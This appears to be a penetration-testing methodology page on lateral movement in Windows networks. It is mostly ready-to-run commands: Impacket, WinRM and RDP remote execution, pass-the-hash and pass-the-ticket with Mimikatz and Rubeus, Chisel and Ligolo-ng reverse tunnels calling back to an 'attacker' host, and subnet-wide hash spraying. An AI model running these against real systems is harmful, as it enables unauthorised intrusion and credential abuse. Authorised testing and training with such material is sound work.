---
title: Lateral Movement
category: methodology
tags: [lateral-movement, pivoting, pass-the-hash]
last_updated: 2025-12-27
---

# Lateral Movement

## Overview

Lateral movement refers to techniques used to move through a network after gaining initial access. The goal is to access additional systems, escalate privileges across the environment, and reach high-value targets.

**Prerequisites:**
- Valid credentials (password, hash, or ticket)
- Network connectivity to target systems
- Appropriate permissions on target

## Windows Lateral Movement Techniques

### PsExec

Remote command execution via SMB (requires admin shares).

```bash
# Impacket psexec
impacket-psexec domain/user:password@target
impacket-psexec -hashes :NTLM_HASH domain/user@target

# Metasploit
use exploit/windows/smb/psexec
```

### WMI (Windows Management Instrumentation)

```bash
# Impacket wmiexec
impacket-wmiexec domain/user:password@target
impacket-wmiexec -hashes :NTLM_HASH domain/user@target

# PowerShell
Invoke-WmiMethod -ComputerName target -Credential $cred -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami"
```

### WinRM (Windows Remote Management)

```bash
# Evil-WinRM
evil-winrm -i target -u user -p password
evil-winrm -i target -u user -H NTLM_HASH

# PowerShell
Enter-PSSession -ComputerName target -Credential $cred
Invoke-Command -ComputerName target -Credential $cred -ScriptBlock { whoami }
```

### RDP (Remote Desktop Protocol)

```bash
# With password
xfreerdp /u:user /p:password /v:target /cert:ignore

# With NTLM hash (Restricted Admin mode required)
xfreerdp /u:user /pth:NTLM_HASH /v:target /cert:ignore

# Enable Restricted Admin (requires admin on target)
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0
```

### DCOM (Distributed Component Object Model)

```bash
# Impacket dcomexec
impacket-dcomexec domain/user:password@target
impacket-dcomexec -hashes :NTLM_HASH domain/user@target

# Common DCOM objects: MMC20.Application, ShellWindows, ShellBrowserWindow
```

### SMB Execution

```bash
# Impacket smbexec
impacket-smbexec domain/user:password@target

# Impacket atexec (via scheduled tasks)
impacket-atexec domain/user:password@target "command"
```

## Pass-the-Hash (PtH)

Use NTLM hash instead of plaintext password for authentication.

```bash
# CrackMapExec
crackmapexec smb target -u user -H NTLM_HASH
crackmapexec smb target -u user -H NTLM_HASH -x "whoami"

# Impacket tools
impacket-psexec -hashes :NTLM_HASH user@target
impacket-wmiexec -hashes :NTLM_HASH user@target

# Evil-WinRM
evil-winrm -i target -u user -H NTLM_HASH
```

## Pass-the-Ticket (PtT)

Use Kerberos tickets for authentication (avoids NTLM logging).

```bash
# Export ticket with Mimikatz
sekurlsa::tickets /export

# Import ticket
kerberos::ptt ticket.kirbi

# Linux - convert and use with Impacket
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass target
```

## Overpass-the-Hash

Request Kerberos ticket using NTLM hash.

```powershell
# Mimikatz
sekurlsa::pth /user:user /domain:domain.local /ntlm:HASH /run:powershell.exe

# Rubeus
Rubeus.exe asktgt /user:user /rc4:HASH /ptt
```

## Pivoting and Tunneling

### SSH Tunneling

```bash
# Local port forward
ssh -L 8080:internal_target:80 user@pivot_host

# Dynamic SOCKS proxy
ssh -D 9050 user@pivot_host

# Remote port forward
ssh -R 8080:localhost:80 user@pivot_host
```

### Chisel

```bash
# Server (attacker)
chisel server -p 8000 --reverse

# Client (pivot host)
chisel client attacker:8000 R:socks
```

### Ligolo-ng

```bash
# Proxy (attacker)
ligolo-proxy -selfcert

# Agent (pivot host)
ligolo-agent -connect attacker:11601 -ignore-cert
```

### Proxychains

```bash
# Configure /etc/proxychains.conf
socks5 127.0.0.1 1080

# Use with tools
proxychains nmap -sT -Pn target
proxychains crackmapexec smb target
```

## Tool Recommendations

| Tool | Purpose |
|------|---------|
| Impacket | Python tools for Windows protocols |
| CrackMapExec/NetExec | Swiss army knife for Windows/AD |
| Evil-WinRM | WinRM shell with upload/download |
| Mimikatz | Credential extraction and PtH/PtT |
| Rubeus | Kerberos abuse toolkit |
| Chisel | TCP/UDP tunneling over HTTP |
| Ligolo-ng | Tunneling with TUN interface |
| Proxychains | Proxy tool chains |

## Quick Reference

```bash
# Check if host is reachable for lateral movement
crackmapexec smb targets.txt -u user -p password

# Spray credentials across network
crackmapexec smb 192.168.1.0/24 -u user -H hash --continue-on-success

# Execute command on multiple hosts
crackmapexec smb targets.txt -u user -H hash -x "whoami"
```
